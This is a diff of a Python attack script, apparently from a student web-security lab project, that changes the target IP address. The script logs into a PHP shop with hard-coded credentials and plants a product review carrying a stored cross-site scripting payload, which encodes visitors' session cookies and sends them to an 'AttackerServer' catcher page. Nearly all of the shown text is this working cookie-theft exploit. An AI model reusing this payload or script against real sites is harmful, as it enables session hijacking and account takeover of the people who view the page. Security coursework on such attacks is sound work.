@@ -1,7 +1,7 @@
 import requests
 
 # --- Target Configuration ---
-BASE_URL = "http://192.168.56.1/CyberProject"
+BASE_URL = "http://10.125.201.170/CyberProject"
 LOGIN_URL = f"{BASE_URL}/login.php"
 # The ID of the electric kettle in the DB is 81
 TARGET_PRODUCT_URL = f"{BASE_URL}/product_view.php?id=81"
@@ -15,7 +15,7 @@ PASSWORD = "hucker123"
 PAYLOAD = """
 The handle gets too hot, and there's a weird smell.<script>
     var encoded = btoa(document.cookie);
-    fetch('http://192.168.56.1/CyberProject/AttackerServer/catcher.php?data=' + encoded);
+    fetch('http://10.125.201.170/CyberProject/AttackerServer/catcher.php?data=' + encoded);
 </script>
 """
 
